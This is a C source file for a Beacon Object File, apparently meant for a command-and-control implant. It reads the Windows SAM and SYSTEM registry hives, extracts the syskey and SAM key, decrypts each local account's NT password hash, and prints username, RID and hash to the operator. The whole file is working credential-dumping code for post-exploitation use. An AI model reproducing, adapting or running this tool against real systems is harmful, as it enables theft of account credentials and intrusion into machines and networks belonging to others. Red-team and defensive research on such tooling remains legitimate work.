/*
 * lsadump_sam BOF by shashinma
 * Dumps SAM hashes directly from registry
 * Requires admin privileges
 */

#include "include/sam.h"
#include "lsadump_helper.c"

// ============================================================================
// Crypto: DES ECB Decryption
// ============================================================================

static BOOL DecryptDES_ECB(HCRYPTPROV hProv, const BYTE* key8, 
                            const BYTE* encrypted, DWORD encLen,
                            BYTE* decrypted) {
    DES_KEY_BLOB keyBlob;
    HCRYPTKEY hKey = 0;
    DWORD decLen = encLen;
    DWORD mode = CRYPT_MODE_ECB;

    keyBlob.header.bType = PLAINTEXTKEYBLOB;
    keyBlob.header.bVersion = CUR_BLOB_VERSION;
    keyBlob.header.reserved = 0;
    keyBlob.header.aiKeyAlg = CALG_DES;
    keyBlob.keySize = 8;
    MSVCRT$memcpy(keyBlob.key, key8, 8);

    if (!ADVAPI32$CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey))
        return FALSE;

    ADVAPI32$CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);

    MSVCRT$memcpy(decrypted, encrypted, encLen);
    if (!ADVAPI32$CryptDecrypt(hKey, 0, FALSE, 0, decrypted, &decLen)) {
        ADVAPI32$CryptDestroyKey(hKey);
        return FALSE;
    }

    ADVAPI32$CryptDestroyKey(hKey);
    return TRUE;
}

// ============================================================================
// SAM Key Extraction
// ============================================================================

static BOOL GetSamKey(HKEY hSam, const BYTE sysKey[SYSKEY_LENGTH], BYTE samKey[SYSKEY_LENGTH], HCRYPTPROV hProv) {
    HKEY hAccount;
    DWORD size, type;
    BYTE* fData = NULL;
    BYTE decrypted[32];
    LONG res;
    DOMAIN_ACCOUNT_F* pDomAccF;
    SAM_KEY_DATA_AES* pAesKey;

    res = ADVAPI32$RegOpenKeyExW(hSam, L"SAM\\Domains\\Account", 0, KEY_READ, &hAccount);
    if (res != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] RegOpenKeyEx SAM\\Domains\\Account failed: %d\n", res);
        return FALSE;
    }

    size = 0;
    ADVAPI32$RegQueryValueExW(hAccount, L"F", NULL, &type, NULL, &size);
    if (size < sizeof(DOMAIN_ACCOUNT_F)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] F value size %u < expected %u\n", size, (DWORD)sizeof(DOMAIN_ACCOUNT_F));
        ADVAPI32$RegCloseKey(hAccount);
        return FALSE;
    }

    fData = (BYTE*)AllocMem(size);
    if (!fData) { ADVAPI32$RegCloseKey(hAccount); return FALSE; }

    res = ADVAPI32$RegQueryValueExW(hAccount, L"F", NULL, NULL, fData, &size);
    ADVAPI32$RegCloseKey(hAccount);
    if (res != ERROR_SUCCESS) { FreeMem(fData); return FALSE; }

    pDomAccF = (DOMAIN_ACCOUNT_F*)fData;
    if (pDomAccF->Revision != 2 && pDomAccF->Revision != 3) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Unknown DOMAIN_ACCOUNT_F Revision: %u\n", pDomAccF->Revision);
        FreeMem(fData);
        return FALSE;
    }

    if (pDomAccF->keys1.Revision == 2) {
        pAesKey = (SAM_KEY_DATA_AES*)&pDomAccF->keys1;
        BeaconPrintf(CALLBACK_OUTPUT, "[*] SAM key AES: DataLen=%u\n", pAesKey->DataLen);
        if (!DecryptAES128_CBC(hProv, sysKey, pAesKey->Salt, pAesKey->data, pAesKey->DataLen, decrypted)) {
            BeaconPrintf(CALLBACK_ERROR, "[!] DecryptAES128_CBC failed\n");
            FreeMem(fData);
            return FALSE;
        }
        MSVCRT$memcpy(samKey, decrypted, 16);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Unknown SAM key Revision: %u (expected 2 for AES)\n", pDomAccF->keys1.Revision);
        FreeMem(fData);
        return FALSE;
    }

    FreeMem(fData);
    return TRUE;
}

// ============================================================================
// DES Key Generation from RID
// ============================================================================

static void DesKeyFromSid(DWORD rid, BYTE key1[8], BYTE key2[8]) {
    BYTE s1[7], s2[7];
    s1[0] = (BYTE)(rid & 0xff);
    s1[1] = (BYTE)((rid >> 8) & 0xff);
    s1[2] = (BYTE)((rid >> 16) & 0xff);
    s1[3] = (BYTE)((rid >> 24) & 0xff);
    s1[4] = s1[0]; s1[5] = s1[1]; s1[6] = s1[2];
    s2[0] = s1[3]; s2[1] = s1[0]; s2[2] = s1[1]; s2[3] = s1[2];
    s2[4] = s2[0]; s2[5] = s2[1]; s2[6] = s2[2];

    key1[0] = ODD_PARITY[(s1[0] >> 1) << 1];
    key1[1] = ODD_PARITY[(((s1[0] & 0x01) << 6) | (s1[1] >> 2)) << 1];
    key1[2] = ODD_PARITY[(((s1[1] & 0x03) << 5) | (s1[2] >> 3)) << 1];
    key1[3] = ODD_PARITY[(((s1[2] & 0x07) << 4) | (s1[3] >> 4)) << 1];
    key1[4] = ODD_PARITY[(((s1[3] & 0x0F) << 3) | (s1[4] >> 5)) << 1];
    key1[5] = ODD_PARITY[(((s1[4] & 0x1F) << 2) | (s1[5] >> 6)) << 1];
    key1[6] = ODD_PARITY[(((s1[5] & 0x3F) << 1) | (s1[6] >> 7)) << 1];
    key1[7] = ODD_PARITY[(s1[6] & 0x7F) << 1];

    key2[0] = ODD_PARITY[(s2[0] >> 1) << 1];
    key2[1] = ODD_PARITY[(((s2[0] & 0x01) << 6) | (s2[1] >> 2)) << 1];
    key2[2] = ODD_PARITY[(((s2[1] & 0x03) << 5) | (s2[2] >> 3)) << 1];
    key2[3] = ODD_PARITY[(((s2[2] & 0x07) << 4) | (s2[3] >> 4)) << 1];
    key2[4] = ODD_PARITY[(((s2[3] & 0x0F) << 3) | (s2[4] >> 5)) << 1];
    key2[5] = ODD_PARITY[(((s2[4] & 0x1F) << 2) | (s2[5] >> 6)) << 1];
    key2[6] = ODD_PARITY[(((s2[5] & 0x3F) << 1) | (s2[6] >> 7)) << 1];
    key2[7] = ODD_PARITY[(s2[6] & 0x7F) << 1];
}

// ============================================================================
// NT Hash Decryption
// ============================================================================

static BOOL DecryptNtHash(const BYTE* vData, DWORD vSize, const BYTE samKey[16], DWORD rid, 
                          BYTE ntHash[16], HCRYPTPROV hProv) {
    DWORD ntOffset, ntLength;
    BYTE* hashData;
    BYTE encryptedHash[16];
    BYTE desKey1[8], desKey2[8];
    
    if (vSize < 0xA8 + 8) return FALSE;
    
    ntOffset = *(DWORD*)(vData + 0xA8) + 0xCC;
    ntLength = *(DWORD*)(vData + 0xA8 + 4);
    
    if (ntLength < 4 || ntOffset + ntLength > vSize) return FALSE;
    
    hashData = (BYTE*)(vData + ntOffset);
    
    if (ntLength <= 24) return FALSE;
    
    WORD revision = *(WORD*)(hashData + 2);
    
    if (revision == 2) {
        BYTE aesIv[16];
        BYTE decrypted[32];
        DWORD encDataLen = ntLength - 24;
        
        MSVCRT$memcpy(aesIv, hashData + 8, 16);
        if (!DecryptAES128_CBC(hProv, samKey, aesIv, hashData + 24, encDataLen, decrypted))
            return FALSE;
        MSVCRT$memcpy(encryptedHash, decrypted, 16);
    } else {
        return FALSE;
    }
    
    DesKeyFromSid(rid, desKey1, desKey2);
    
    if (!DecryptDES_ECB(hProv, desKey1, encryptedHash, 8, ntHash) ||
        !DecryptDES_ECB(hProv, desKey2, encryptedHash + 8, 8, ntHash + 8))
        return FALSE;
    
    return TRUE;
}

// ============================================================================
// User Enumeration
// ============================================================================

static void EnumerateUsers(HKEY hSam, const BYTE samKey[16], HCRYPTPROV hProv) {
    HKEY hUsers;
    DWORD numSubKeys, maxKeyLen, i;
    wchar_t* keyName = NULL;
    DWORD keyNameLen;
    LONG res;
    DWORD userCount = 0;

    res = ADVAPI32$RegOpenKeyExW(hSam, L"SAM\\Domains\\Account\\Users", 0, KEY_READ, &hUsers);
    if (res != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open Users: %d\n", res);
        return;
    }

    ADVAPI32$RegQueryInfoKeyW(hUsers, NULL, NULL, NULL, &numSubKeys, &maxKeyLen, NULL, NULL, NULL, NULL, NULL, NULL);
    
    maxKeyLen++;
    keyName = (wchar_t*)AllocMem((maxKeyLen + 1) * sizeof(wchar_t));
    if (!keyName) { ADVAPI32$RegCloseKey(hUsers); return; }

    for (i = 0; i < numSubKeys; i++) {
        HKEY hUser;
        DWORD rid;
        BYTE* vData = NULL;
        DWORD vSize, type, usernameOffset, usernameLen, j;
        wchar_t* username;
        BYTE ntHash[16];
        char usernameA[128];

        keyNameLen = maxKeyLen;
        if (ADVAPI32$RegEnumKeyExW(hUsers, i, keyName, &keyNameLen, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) continue;
        if (MSVCRT$_wcsicmp(keyName, L"Names") == 0) continue;

        rid = MSVCRT$wcstoul(keyName, NULL, 16);
        if (rid == 0) continue;

        if (ADVAPI32$RegOpenKeyExW(hUsers, keyName, 0, KEY_READ, &hUser) != ERROR_SUCCESS) continue;

        vSize = 0;
        ADVAPI32$RegQueryValueExW(hUser, L"V", NULL, &type, NULL, &vSize);
        if (vSize == 0) { ADVAPI32$RegCloseKey(hUser); continue; }

        vData = (BYTE*)AllocMem(vSize);
        if (!vData) { ADVAPI32$RegCloseKey(hUser); continue; }

        if (ADVAPI32$RegQueryValueExW(hUser, L"V", NULL, NULL, vData, &vSize) != ERROR_SUCCESS) {
            FreeMem(vData);
            ADVAPI32$RegCloseKey(hUser);
            continue;
        }
        ADVAPI32$RegCloseKey(hUser);

        if (vSize < 0x0C + 8) { FreeMem(vData); continue; }

        usernameOffset = *(DWORD*)(vData + 0x0C) + 0xCC;
        usernameLen = *(DWORD*)(vData + 0x0C + 4);

        if (usernameOffset + usernameLen > vSize || usernameLen == 0) { FreeMem(vData); continue; }

        username = (wchar_t*)(vData + usernameOffset);
        for (j = 0; j < usernameLen / 2 && j < 127; j++)
            usernameA[j] = (char)username[j];
        usernameA[j] = '\0';

        if (DecryptNtHash(vData, vSize, samKey, rid, ntHash, hProv)) {
            char hashStr[64];
            FormatHex(ntHash, 16, hashStr, sizeof(hashStr));
            BeaconPrintf(CALLBACK_OUTPUT, "%s:%d:%s\n", usernameA, rid, hashStr);
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "%s:%d:<empty>\n", usernameA, rid);
        }
        userCount++;
        FreeMem(vData);
    }

    FreeMem(keyName);
    ADVAPI32$RegCloseKey(hUsers);
    BeaconPrintf(CALLBACK_OUTPUT, "\n[+] %u user(s)\n", userCount);
}

// ============================================================================
// Entry Point
// ============================================================================

void go(char* args, int len) {
    (void)args; (void)len;
    
    HKEY hSystem = NULL, hSam = NULL;
    BYTE sysKey[SYSKEY_LENGTH];
    BYTE samKey[SYSKEY_LENGTH];
    LONG res;
    HCRYPTPROV hProv = 0;
    char hexStr[64];

    BeaconPrintf(CALLBACK_OUTPUT, "\n=== lsadump::sam ===\n\n");

    if (!ADVAPI32$CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CryptAcquireContext failed\n");
        return;
    }

    res = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &hSystem);
    if (res != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open SYSTEM: %d\n", res);
        ADVAPI32$CryptReleaseContext(hProv, 0);
        return;
    }

    if (!GetSyskey(hSystem, sysKey)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to extract syskey\n");
        ADVAPI32$RegCloseKey(hSystem);
        ADVAPI32$CryptReleaseContext(hProv, 0);
        return;
    }
    FormatHex(sysKey, SYSKEY_LENGTH, hexStr, sizeof(hexStr));
    BeaconPrintf(CALLBACK_OUTPUT, "Syskey: %s\n", hexStr);
    ADVAPI32$RegCloseKey(hSystem);

    res = ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SAM", 0, KEY_READ, &hSam);
    if (res != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open SAM: %d\n", res);
        ADVAPI32$CryptReleaseContext(hProv, 0);
        return;
    }

    if (!GetSamKey(hSam, sysKey, samKey, hProv)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to decrypt SAM key\n");
        ADVAPI32$RegCloseKey(hSam);
        ADVAPI32$CryptReleaseContext(hProv, 0);
        return;
    }
    FormatHex(samKey, SYSKEY_LENGTH, hexStr, sizeof(hexStr));
    BeaconPrintf(CALLBACK_OUTPUT, "SAMKey: %s\n", hexStr);
    BeaconPrintf(CALLBACK_OUTPUT, "\n");

    EnumerateUsers(hSam, samKey, hProv);

    ADVAPI32$RegCloseKey(hSam);
    ADVAPI32$CryptReleaseContext(hProv, 0);
}
